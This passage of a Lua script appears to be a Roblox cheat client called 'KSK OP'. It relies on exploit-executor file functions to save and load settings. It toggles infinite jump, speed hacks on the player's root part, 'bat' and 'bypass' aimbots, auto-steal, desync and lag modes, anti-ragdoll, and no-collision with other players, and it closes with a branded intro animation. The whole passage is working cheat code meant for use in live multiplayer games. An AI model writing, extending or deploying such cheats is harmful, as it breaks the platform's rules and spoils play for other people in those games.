        dropKey=ks(KB.Drop),tpDownKey=ks(KB.TPDown),autoBatKey=ks(KB.AutoBat),
        speedKey=ks(KB.Speed),laggerKey=ks(KB.Lagger),guiHideKey=ks(KB.GuiHide),
		bypassKey=ks(KB.Bypass),
        infJump=State.infJumpEnabled,
		holdJump=State.holdJumpEnabled,
        antiRagdoll=State.antiRagdollEnabled,
        fpsBoost=State.fpsBoostEnabled,
        medusaCounter=State.medusaCounterEnabled,
        batCounter=State.batCounterEnabled,
        autoStealEnabled=Steal.AutoStealEnabled,
        unwalkEnabled=State.unwalkEnabled,
        desyncEnabled=State.desyncEnabled,
        autoSwing=State.autoSwingEnabled,
        autoBatToggled=State.autoBatToggled,
        bypassToggled=State.bypassToggled,
        bypassMode=State.bypassMode,
        bypassSpeed=State.bypassSpeed,
        stretchRez=State.stretchRezEnabled,
        removeAccessories=State.removeAccessoriesEnabled,
        antiLag=State.antiLagEnabled,
        darkMode=State.darkModeEnabled,
        introEnabled=State.introEnabled,
        selectedIntroMusic=State.selectedIntroMusic,
        autoTPDown=autoTPDownEnabled,
        autoTPDownHeight=autoTPDownHeight,
		medusaResetEnabled=medusaResetEnabled,
		tryardAnimEnabled=State.tryardAnimEnabled,
        panelPos=sp(MobilePanel),mainPos=sp(main),miniPos=sp(mini),pbPos=sp(pbFrame),
        bypassPos=sp(bypassBtn),
        resetPos=sp(resetBtn),
    }
    local ok,enc=pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and enc then
        local wf = writefile or (syn and syn.writefile) or (getgenv and getgenv().writefile) or _writefile
        if wf then pcall(wf, CONFIG_FILE, enc) end
    end
    if btn then local prev=btn.Text; btn.Text="Saved!"; task.wait(1.5); if btn and btn.Parent then btn.Text=prev end end
end

loadConfig=function()
    local isf = isfile or (syn and syn.isfile) or (getgenv and getgenv().isfile) or _isfile
    local rdf = readfile or (syn and syn.readfile) or (getgenv and getgenv().readfile) or _readfile
    local hasFile=false; pcall(function() hasFile=isf(CONFIG_FILE) end)
    if not hasFile then return end
    local raw; pcall(function() raw=rdf(CONFIG_FILE) end)
    if not raw then return end
    local cfg; pcall(function() cfg=HttpService:JSONDecode(raw) end)
    if not cfg then return end

    if cfg.normalSpeed then NS=cfg.normalSpeed; task.defer(function() if normalBox then normalBox.Text=tostring(NS) end end) end
    if cfg.carrySpeed  then CS=cfg.carrySpeed;  task.defer(function() if carryBox  then carryBox.Text=tostring(CS)  end end) end
    if cfg.laggerSpeed then LS=cfg.laggerSpeed; task.defer(function() if laggerBox then laggerBox.Text=tostring(LS) end end) end
    if cfg.laggerCarrySpeed then LS2=cfg.laggerCarrySpeed; task.defer(function() if laggerBox2 then laggerBox2.Text=tostring(LS2) end end) end
    if cfg.uiScale and type(cfg.uiScale)=="number" then
        uiScaleValue=math.clamp(math.floor(cfg.uiScale+0.5),50,150)
        if mainUIScale then mainUIScale.Scale=uiScaleValue/100 end
        task.defer(function() if uiScaleBox then uiScaleBox.Text=tostring(uiScaleValue) end end)
    end
    if cfg.uiLocked then uiLocked=true; task.defer(function() if setLockUIVisual then setLockUIVisual(true) end end) end
    if cfg.selectedIntroMusic then 
        State.selectedIntroMusic = cfg.selectedIntroMusic 
        task.defer(function() 
            if getgenv().KSKOPMusicBtn then 
                getgenv().KSKOPMusicBtn.Text = "Music " .. State.selectedIntroMusic 
            end 
        end)
    end
    if cfg.introEnabled ~= nil then
        State.introEnabled = cfg.introEnabled
        if setIntroToggle then task.defer(function() setIntroToggle(cfg.introEnabled) end) end
    end
    if cfg.autoTPDown then 
        autoTPDownEnabled=true
        task.defer(function() 
            if setAutoTPDownVisual then setAutoTPDownVisual(true) end
            startAutoTPDown() 
        end) 
    end
    if cfg.autoTPDownHeight and type(cfg.autoTPDownHeight)=="number" then 
        autoTPDownHeight=math.clamp(cfg.autoTPDownHeight,0,500)
        task.defer(function()
            for _, page in pairs(tabPages) do
                for _, child in ipairs(page:GetChildren()) do
                    if child:IsA("Frame") then
                        for _, subchild in ipairs(child:GetChildren()) do
                            if subchild:IsA("TextBox") and subchild.Parent.Name ~= "KSKOPGUI" then
                                for _, label in ipairs(child:GetChildren()) do
                                    if label:IsA("TextLabel") and label.Text == "TP Down Height" then
                                        subchild.Text = tostring(autoTPDownHeight)
                                        break
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
    if cfg.stealRadius or cfg.grabRadius then
        Steal.StealRadius = cfg.stealRadius or cfg.grabRadius
        task.defer(function() if progressRadLbl then progressRadLbl.Text="Radius: "..Steal.StealRadius end end)
    end

    local function lk(e,d) if not d then return end
        if d.kb and Enum.KeyCode[d.kb] then e.kb=Enum.KeyCode[d.kb] end
        if d.gp and Enum.KeyCode[d.gp] then e.gp=Enum.KeyCode[d.gp] end
    end
    lk(KB.AutoLeft,cfg.autoLeftKey); lk(KB.AutoRight,cfg.autoRightKey)
    lk(KB.Drop,cfg.dropKey); lk(KB.TPDown,cfg.tpDownKey); lk(KB.AutoBat,cfg.autoBatKey)
    lk(KB.Speed,cfg.speedKey); lk(KB.Lagger,cfg.laggerKey); lk(KB.GuiHide,cfg.guiHideKey)
	lk(KB.Bypass,cfg.bypassKey)

    if cfg.infJump           then State.infJumpEnabled=true;           if setInfJump           then setInfJump(true)           end end
	if cfg.holdJump          then State.holdJumpEnabled=true;          if setHoldJump          then setHoldJump(true)          end end
    if cfg.antiRagdoll       then State.antiRagdollEnabled=true;       if setAntiRag           then setAntiRag(true)           end; startAntiRagdoll() end
    if cfg.fpsBoost          then State.fpsBoostEnabled=true;          if setFps               then setFps(true)               end; pcall(applyFPSBoost) end
    if cfg.medusaCounter     then State.medusaCounterEnabled=true;     if setMedusaCounter     then setMedusaCounter(true)     end; setupMedusaCounter(LP.Character) end
    if cfg.batCounter        then State.batCounterEnabled=true;        if setBatCounter        then setBatCounter(true)        end; startBatCounter() end
    if cfg.autoStealEnabled  then Steal.AutoStealEnabled=true;         if setAutoGrab          then setAutoGrab(true)          end; pcall(startAutoSteal) end
    if cfg.autoSwing         then State.autoSwingEnabled=true;         if setAutoSwingVisual   then setAutoSwingVisual(true)   end end
    if cfg.unwalkEnabled     then State.unwalkEnabled=true; if setUnwalkToggle then setUnwalkToggle(true) end; startUnwalk() end
    if cfg.stretchRez        then State.stretchRezEnabled=true;        if setStretchRez        then setStretchRez(true)        end end
    if cfg.removeAccessories then State.removeAccessoriesEnabled=true; if setRemoveAccessories then setRemoveAccessories(true) end end
    if cfg.antiLag           then State.antiLagEnabled=true;           if setAntiLag           then setAntiLag(true)           end end
    if cfg.darkMode          then State.darkModeEnabled=true;          if setDarkMode          then setDarkMode(true)          end end
    if cfg.desyncEnabled     then State.desyncEnabled=true; task.defer(function() if setDesync then setDesync(true) end; if saDesync then saDesync(true) end; startDesyncSession() end) end
    if cfg.autoBatToggled    then State.autoBatToggled=true; task.defer(function() if autoBatSetVisual then autoBatSetVisual(true) end; pcall(startBatAimbot) end) end
    if cfg.bypassToggled     then State.bypassToggled=true; task.defer(function() if bypassSetVisual then bypassSetVisual(true) end; if bypassBtn then updateBypassBtnAppearance(true) end; startBypassAimbot() end) end
    if cfg.bypassMode        then State.bypassMode=cfg.bypassMode; if bypassModeBtn then bypassModeBtn.Text=State.bypassMode==1 and "Bypass" or "TP Bat" end end
    if cfg.bypassSpeed       then State.bypassSpeed=cfg.bypassSpeed end
    if cfg.medusaResetEnabled ~= nil then
        medusaResetEnabled = cfg.medusaResetEnabled
        if medusaResetEnabled and LP.Character then
            task.defer(function() setupMedusaWatcher(LP.Character) end)
        end
    end
	if cfg.tryardAnimEnabled ~= nil then
		State.tryardAnimEnabled = cfg.tryardAnimEnabled
		if State.tryardAnimEnabled then
			task.defer(startTryardAnim)
		else
			task.defer(stopTryardAnim)
		end
		if tryhardVisual then tryhardVisual(cfg.tryardAnimEnabled) end
	end
    task.spawn(function()
        task.wait(0.5)
        local function lp(frame, d) if frame and type(d)=="table" and d.xs~=nil then frame.Position=UDim2.new(d.xs,d.xo,d.ys,d.yo) end end
        lp(main, cfg.mainPos); lp(mini, cfg.miniPos)
        lp(MobilePanel, cfg.panelPos); lp(pbFrame, cfg.pbPos)
        if cfg.bypassPos then
            bypassBtn.Position = UDim2.new(cfg.bypassPos.xs or 0, cfg.bypassPos.xo or 240, cfg.bypassPos.ys or 0, cfg.bypassPos.yo or 50)
        end
        if cfg.resetPos then
            resetBtn.Position = UDim2.new(cfg.resetPos.xs or 0, cfg.resetPos.xo or 180, cfg.resetPos.ys or 0, cfg.resetPos.yo or 50)
        end
    end)
end

local function setupOtherPlayerBillboard(player)
    if player == LP then return end
    
    local function addBillboard(char)
        task.wait(0.2)
        local head = char:FindFirstChild("Head")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not head or not hrp then return end
        
        local oldBB = head:FindFirstChild("KSKOPOtherBB")
        if oldBB then oldBB:Destroy() end
        
        local bb = Instance.new("BillboardGui", head)
        bb.Name = "KSKOPOtherBB"
        bb.Size = UDim2.new(0, 100, 0, 30)
        bb.StudsOffset = Vector3.new(0, 3, 0)
        bb.AlwaysOnTop = true
        
        local speedLbl = Instance.new("TextLabel", bb)
        speedLbl.Size = UDim2.new(1, 0, 1, 0)
        speedLbl.BackgroundTransparency = 1
        speedLbl.Text = "0.0"
        speedLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        speedLbl.Font = Enum.Font.GothamBlack
        speedLbl.TextScaled = true
        speedLbl.TextStrokeTransparency = 0
        speedLbl.TextStrokeColor3 = Color3.new(0, 0, 0)
        
        local conn = RunService.RenderStepped:Connect(function()
            if not hrp or not hrp.Parent then 
                conn:Disconnect()
                return 
            end
            local hspd = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
            speedLbl.Text = string.format("%.1f", hspd)
        end)
    end
    
    player.CharacterAdded:Connect(addBillboard)
    
    if player.Character then
        task.spawn(addBillboard, player.Character)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LP then
        setupOtherPlayerBillboard(player)
    end
end
Players.PlayerAdded:Connect(setupOtherPlayerBillboard)

local h,hrp,speedLbl
local function setupChar(char)
    task.wait(0.1)
    h=char:WaitForChild("Humanoid",5)
    hrp=char:WaitForChild("HumanoidRootPart",5)
    if not h or not hrp then return end

    local head=char:FindFirstChild("Head")
    if head then
        local oldBB=head:FindFirstChild("KSKOPBB"); if oldBB then oldBB:Destroy() end
        local bb=Instance.new("BillboardGui",head); bb.Name="KSKOPBB"
        bb.Size=UDim2.new(0,160,0,52); bb.StudsOffset=Vector3.new(0,3,0); bb.AlwaysOnTop=true
        speedLbl=Instance.new("TextLabel",bb); speedLbl.Name="SpeedBillLbl"
        speedLbl.Size=UDim2.new(1,0,0,24); speedLbl.Position=UDim2.new(0,0,0,0); speedLbl.BackgroundTransparency=1
        speedLbl.Text="0.0"; speedLbl.TextColor3=Color3.fromRGB(255,255,255)
        speedLbl.Font=Enum.Font.GothamBlack; speedLbl.TextScaled=true
        speedLbl.TextStrokeTransparency=0; speedLbl.TextStrokeColor3=Color3.new(0,0,0)
        local discordLbl=Instance.new("TextLabel",bb)
        discordLbl.Size=UDim2.new(1,0,0,28); discordLbl.Position=UDim2.new(0,0,0,26)
        discordLbl.BackgroundTransparency=1; discordLbl.Text="KSK OP ON TOP"
        discordLbl.TextColor3=Color3.fromRGB(255,255,255); discordLbl.Font=Enum.Font.GothamBold
        discordLbl.TextScaled=true; discordLbl.TextStrokeTransparency=0.1
        discordLbl.TextStrokeColor3=Color3.new(0,0,0)
    end

    if State.unwalkEnabled then task.wait(0.3); startUnwalk() end
    stopAntiRagdoll()
    task.wait(0.5)
    startAntiRagdoll() -- SIEMPRE activo
    State.antiRagdollEnabled = true

    if State.medusaCounterEnabled then setupMedusaCounter(char) end
    if State.autoBatToggled then stopBatAimbot(); task.wait(0.2); pcall(startBatAimbot) end
    if State.bypassToggled then startBypassAimbot() end
    if State.batCounterEnabled then task.wait(0.3); startBatCounter() end
    if Steal.AutoStealEnabled then pcall(stopAutoSteal); task.wait(0.5); pcall(startAutoSteal) end
    if medusaResetEnabled then
        setupMedusaWatcher(char)
    end
    -- Tryhard animation
    if State.tryardAnimEnabled then
        saveOriginalTryardAnims(char)
        applyTryardAnimPack(char)
    end
end

LP.CharacterAdded:Connect(setupChar)
if LP.Character then task.spawn(function() setupChar(LP.Character) end) end

RunService.Stepped:Connect(function()
    for _,p in ipairs(Players:GetPlayers()) do
        if p~=LP and p.Character then
            for _,part in ipairs(p.Character:GetChildren()) do if part:IsA("BasePart") then part.CanCollide=false end end
        end
    end
end)

-- ============================================================
-- INFINITE JUMP + HOLD JUMP
-- ============================================================
UIS.JumpRequest:Connect(function()
    if not State.infJumpEnabled then return end
    local c=LP.Character
    if not c then return end
    local root=c:FindFirstChild("HumanoidRootPart")
    if root then
        root.Velocity = Vector3.new(root.Velocity.X, 55, root.Velocity.Z)
    end
end)

RunService.Heartbeat:Connect(function()
    if not State.holdJumpEnabled then return end
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    local hum = char:FindFirstChildOfClass("Humanoid")
    local spaceHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum and hum.Jump == true)
    if spaceHeld and root.Velocity.Y < 30 then
        root.Velocity = Vector3.new(root.Velocity.X, 55, root.Velocity.Z)
    end
end)

RunService.Heartbeat:Connect(function()
    if not State.infJumpEnabled and not State.holdJumpEnabled then return end
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if root and root.Velocity.Y < -120 then
        root.Velocity = Vector3.new(root.Velocity.X, -120, root.Velocity.Z)
    end
end)

RunService.RenderStepped:Connect(function()
    if not (h and hrp) then return end; if State._tpInProgress then return end
    if not State.autoBatToggled and not State.bypassToggled and not State.autoLeftEnabled and not State.autoRightEnabled then
        local md=h.MoveDirection
        local spd=State.laggerToggled and (laggerPhase==2 and LS2 or LS) or (State.speedToggled and CS or NS)
        if md.Magnitude>0 then
            State.lastMoveDir=md; hrp.Velocity=Vector3.new(md.X*spd,hrp.Velocity.Y,md.Z*spd)
        elseif State.antiRagdollEnabled and State.lastMoveDir.Magnitude>0 then
            local anyHeld=false; for key in pairs(MOVE_KEYS) do if UIS:IsKeyDown(key) then anyHeld=true; break end end
            if anyHeld then hrp.Velocity=Vector3.new(State.lastMoveDir.X*spd,hrp.Velocity.Y,State.lastMoveDir.Z*spd) end
        end
    end
    pcall(function()
        if speedLbl then
            local hspd=Vector3.new(hrp.Velocity.X,0,hrp.Velocity.Z).Magnitude
            speedLbl.Text=string.format("%.1f",hspd)
        end
    end)
end)

UIS.InputBegan:Connect(function(inp,gp)
    if gp and inp.UserInputType ~= Enum.UserInputType.Gamepad1 then return end
    local kc=inp.KeyCode; if kc==Enum.KeyCode.Unknown then return end
    if kbMatch(KB.Speed,kc) then
        State.laggerToggled = false; laggerPhase = 0
        State.speedToggled = not State.speedToggled
        if mobileLaggerSetActive then mobileLaggerSetActive(false) end
        if modeValLbl then modeValLbl.Text = State.speedToggled and "Carry" or "Normal" end
    elseif kbMatch(KB.AutoLeft,kc) then
        State.autoLeftEnabled=not State.autoLeftEnabled
        if State.autoLeftEnabled and State.autoBatToggled then
            State.autoBatToggled=false
            stopBatAimbot()
            if autoBatSetVisual then autoBatSetVisual(false) end
        end
        if State.autoLeftEnabled and State.bypassToggled then
            State.bypassToggled=false
            stopBypassAimbot()
            if bypassSetVisual then bypassSetVisual(false) end
            if bypassBtn then updateBypassBtnAppearance(false) end
        end
        if State.autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
        if autoLeftSetVisual then autoLeftSetVisual(State.autoLeftEnabled) end
    elseif kbMatch(KB.AutoRight,kc) then
        State.autoRightEnabled=not State.autoRightEnabled
        if State.autoRightEnabled and State.autoBatToggled then
            State.autoBatToggled=false
            stopBatAimbot()
            if autoBatSetVisual then autoBatSetVisual(false) end
        end
        if State.autoRightEnabled and State.bypassToggled then
            State.bypassToggled=false
            stopBypassAimbot()
            if bypassSetVisual then bypassSetVisual(false) end
            if bypassBtn then updateBypassBtnAppearance(false) end
        end
        if State.autoRightEnabled then startAutoRight() else stopAutoRight() end
        if autoRightSetVisual then autoRightSetVisual(State.autoRightEnabled) end
    elseif kbMatch(KB.Drop,kc) then
        if not State.dropActive then task.spawn(runDrop) end
    elseif kbMatch(KB.TPDown,kc) then
        task.spawn(runTPDown)
    elseif kbMatch(KB.Lagger,kc) then
        if laggerPhase == 1 then
            laggerPhase = 2; State.laggerToggled = true; State.speedToggled = false
            if mobileLaggerSetActive then mobileLaggerSetActive(true) end
            if modeValLbl then modeValLbl.Text = "Lagger Carry" end
        else
            laggerPhase = 1; State.laggerToggled = true; State.speedToggled = false
            if mobileSpeedSetActive then mobileSpeedSetActive(false) end
            if mobileLaggerSetActive then mobileLaggerSetActive(true) end
            if modeValLbl then modeValLbl.Text = "Lagger" end
        end
    elseif kbMatch(KB.AutoBat,kc) then
        State.autoBatToggled = not State.autoBatToggled
        if State.autoBatToggled then
            if State.autoLeftEnabled then
                State.autoLeftEnabled=false
                stopAutoLeft()
                if autoLeftSetVisual then autoLeftSetVisual(false) end
            end
            if State.autoRightEnabled then
                State.autoRightEnabled=false
                stopAutoRight()
                if autoRightSetVisual then autoRightSetVisual(false) end
            end
            if State.bypassToggled then
                State.bypassToggled=false
                stopBypassAimbot()
                if bypassSetVisual then bypassSetVisual(false) end
                if bypassBtn then updateBypassBtnAppearance(false) end
            end
            equipBat()
            pcall(startBatAimbot)
        else
            stopBatAimbot()
        end
        if autoBatSetVisual then autoBatSetVisual(State.autoBatToggled) end
    elseif kbMatch(KB.Bypass,kc) then
        toggleBypass()
    elseif kbMatch(KB.GuiHide,kc) then
        State.guiVisible=not State.guiVisible
        pcall(function() main.Visible=State.guiVisible end)
        pcall(function() mini.Visible=not State.guiVisible end)
    end
end)

loadPresetsFile()
loadConfig()

task.spawn(function()
    task.wait(0.3)
    local lastPresetName=loadLastPresetName()
    if lastPresetName and lastPresetName~="" then
        for _,preset in ipairs(Presets) do
            if preset.name==lastPresetName then
                pcall(function() applyPreset(preset.data) end); break
            end
        end
    end
end)

task.delay(1,function() pcall(saveConfig) end)
task.spawn(function() while task.wait(10) do pcall(saveConfig) end end)
Players.LocalPlayer.AncestryChanged:Connect(function() pcall(saveConfig) end)

print("[KSK OP ON TOP] Loaded!")

end)()

-- ============================================================
-- INTRO ANIMATION (ESTILO VELTRIX, PERO CON KSK OP AZUL)
-- ============================================================
local function playIntroAnimation()
    if not State or not State.introEnabled then return end

    local Players = game:GetService("Players")
    local TweenService2 = game:GetService("TweenService")
    local LP2 = Players.LocalPlayer
    local SoundService2 = game:GetService("SoundService")
    local RunService2 = game:GetService("RunService")

    local splashGui = Instance.new("ScreenGui")
    splashGui.Name = "KSKOPIntro"
    splashGui.ResetOnSpawn = false
    splashGui.DisplayOrder = 999
    splashGui.IgnoreGuiInset = true
    if not pcall(function() splashGui.Parent = game:GetService("CoreGui") end) then
        splashGui.Parent = LP2:WaitForChild("PlayerGui")
    end

    local overlay = Instance.new("Frame", splashGui)
    overlay.Size = UDim2.new(1,0,1,0)
    overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
    overlay.BackgroundTransparency = 0
    overlay.BorderSizePixel = 0
    overlay.ZIndex = 1

    local tapHint = Instance.new("TextLabel", splashGui)
    tapHint.Size = UDim2.new(1, 0, 0, 20)
    tapHint.Position = UDim2.new(0, 0, 1, -36)
    tapHint.BackgroundTransparency = 1
    tapHint.Text = "tap anywhere to skip"
    tapHint.TextColor3 = Color3.fromRGB(80, 160, 255)
    tapHint.Font = Enum.Font.Gotham
    tapHint.TextSize = 11
    tapHint.ZIndex = 10
    tapHint.TextXAlignment = Enum.TextXAlignment.Center

    local skipZone = Instance.new("TextButton", splashGui)
    skipZone.Size = UDim2.new(1,0,1,0)
    skipZone.BackgroundTransparency = 1
    skipZone.Text = ""
    skipZone.ZIndex = 9

    local container = Instance.new("Frame", splashGui)
    container.Size = UDim2.new(0,320,0,120)
    container.Position = UDim2.new(0.5,-160,0,-140)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.ZIndex = 2
    container.ClipsDescendants = false

    local titleSplash = Instance.new("TextLabel", container)
    titleSplash.Size = UDim2.new(1,0,0,70)
    titleSplash.Position = UDim2.new(0,0,0,0)
    titleSplash.BackgroundTransparency = 1
    titleSplash.Text = "KSK OP"
    titleSplash.TextColor3 = Color3.fromRGB(255,255,255)
    titleSplash.Font = Enum.Font.GothamBlack
    titleSplash.TextSize = 48
    titleSplash.TextTransparency = 0
    titleSplash.ZIndex = 3
    local grad = Instance.new("UIGradient", titleSplash)
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(80,160,255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200,225,255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(100,80,255))
    })

    local subSplash = Instance.new("TextLabel", container)
    subSplash.Size = UDim2.new(1,0,0,24)
    subSplash.Position = UDim2.new(0,0,0,72)
    subSplash.BackgroundTransparency = 1
    subSplash.Text = "ON TOP"
    subSplash.TextColor3 = Color3.fromRGB(100,180,255)
    subSplash.Font = Enum.Font.Gotham
    subSplash.TextSize = 13
    subSplash.TextTransparency = 0
    subSplash.ZIndex = 3

    local fragments = {}
    local fragTexts = {"K","S","K"," ","O","P"}
    local fragColors = {
        Color3.fromRGB(80,160,255),
        Color3.fromRGB(140,100,255),
        Color3.fromRGB(200,225,255),
        Color3.fromRGB(100,80,255),
        Color3.fromRGB(80,180,255),
        Color3.fromRGB(160,120,255),
    }
    for i, txt in ipairs(fragTexts) do
        local frag = Instance.new("TextLabel", splashGui)
        frag.Size = UDim2.new(0,90,0,60)
        frag.AnchorPoint = Vector2.new(0.5,0.5)
        frag.Position = UDim2.new(0.5, (i-3.5)*52, 0.5, -30)
        frag.BackgroundTransparency = 1
        frag.Text = txt
        frag.TextColor3 = fragColors[i]
        frag.Font = Enum.Font.GothamBlack
        frag.TextSize = 44
        frag.TextTransparency = 1
        frag.ZIndex = 5
        frag.Rotation = 0
        table.insert(fragments, frag)
    end

    local function playSound(id, pitch, vol, parent, delay)
        task.delay(delay or 0, function()
            local s = Instance.new("Sound")
            s.SoundId = id
            s.PlaybackSpeed = pitch
            s.Volume = vol
            s.Parent = parent
            s.RollOffMaxDistance = 0
            s:Play()
            game:GetService("Debris"):AddItem(s, 3)
        end)
    end

    local function playGlitchImpact()
        playSound("rbxassetid://1588058260", 1.0, 0.9, SoundService2, 0)
        playSound("rbxassetid://8627516764", 0.8, 0.7, SoundService2, 0.02)
        playSound("rbxassetid://1588058260", 1.4, 0.5, SoundService2, 0.05)
        playSound("rbxassetid://8627516764", 1.2, 0.4, SoundService2, 0.1)
    end

    local function playWhistle()
        local WHISTLE_ID = "rbxassetid://4612414100"
        playSound(WHISTLE_ID, 2.2, 0.7, SoundService2, 0)
        playSound(WHISTLE_ID, 1.7, 0.8, SoundService2, 0.07)
        playSound(WHISTLE_ID, 1.2, 0.9, SoundService2, 0.15)
        playSound(WHISTLE_ID, 0.85, 0.9, SoundService2, 0.24)
        playSound(WHISTLE_ID, 0.55, 0.7, SoundService2, 0.34)
        playSound(WHISTLE_ID, 0.3, 1.0, SoundService2, 0.5)
    end

    local function doShatterEffect()
        pcall(playGlitchImpact)
        local flash = Instance.new("Frame", splashGui)
        flash.Size = UDim2.new(1,0,1,0)
        flash.BackgroundColor3 = Color3.fromRGB(255,255,255)
        flash.BackgroundTransparency = 0.3
        flash.BorderSizePixel = 0
        flash.ZIndex = 8
        TweenService2:Create(flash, TweenInfo.new(0.18), {BackgroundTransparency=1}):Play()
        game:GetService("Debris"):AddItem(flash, 0.3)
        titleSplash.TextTransparency = 1
        subSplash.TextTransparency = 1
        for i, frag in ipairs(fragments) do
            frag.TextTransparency = 0
            local dirX = (i - 3.5) * 60 + math.random(-80, 80)
            local dirY = math.random(120, 280)
            local rot = math.random(-180, 180)
            local startPosX = frag.Position.X.Offset
            local startPosY = frag.Position.Y.Offset
            local t = 0
            local conn
            conn = RunService2.RenderStepped:Connect(function(dt)
                t = t + dt
                if t > 0.8 then frag.TextTransparency = 1; conn:Disconnect(); return end
                local alpha = t / 0.8
                local px = startPosX + dirX * alpha
                local py = startPosY - dirY * alpha + 300 * alpha * alpha
                local fade = math.clamp(alpha * 1.4 - 0.3, 0, 1)
                frag.Position = UDim2.new(0.5, px, 0.5, py - 30)
                frag.Rotation = rot * alpha
                frag.TextTransparency = fade
                frag.TextSize = math.clamp(44 - alpha * 20, 10, 44)
            end)
        end
        for li = 1, 8 do
            task.delay(li * 0.025, function()
                local line = Instance.new("Frame", splashGui)
                line.Size = UDim2.new(1, 0, 0, math.random(2,6))
                line.Position = UDim2.new(0, 0, math.random(), 0)
                line.BackgroundColor3 = Color3.fromRGB(math.random(60,255), math.random(0,100), math.random(150,255))
                line.BackgroundTransparency = math.random() * 0.3
                line.BorderSizePixel = 0
                line.ZIndex = 7
                TweenService2:Create(line, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play()
                game:GetService("Debris"):AddItem(line, 0.2)
            end)
        end
    end

    local splashDone = false
    local function finishSplash()
        if splashDone then return end
        splashDone = true
        TweenService2:Create(overlay, TweenInfo.new(0.4), {BackgroundTransparency=1}):Play()
        tapHint.Visible = false
        task.wait(0.45)
        if splashGui and splashGui.Parent then splashGui:Destroy() end
    end

    skipZone.MouseButton1Click:Connect(function()
        titleSplash.TextTransparency = 1
        subSplash.TextTransparency = 1
        finishSplash()
    end)

    task.spawn(function()
        TweenService2:Create(overlay, TweenInfo.new(0.2), {BackgroundTransparency=0.1}):Play()
        task.wait(0.15)
        pcall(playWhistle)
        TweenService2:Create(container, TweenInfo.new(0.45, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
            {Position=UDim2.new(0.5,-160,0.5,-60)}):Play()
        task.wait(0.5)
        doShatterEffect()
        task.wait(0.85)
        finishSplash()
    end)

    local _t0 = tick()
    while not splashDone and (tick() - _t0) < 3.0 do
        task.wait(0.05)
    end
end

task.spawn(function()
    task.wait(0.5)
    if State and State.introEnabled then
        playIntroAnimation()
    end
end)

end)()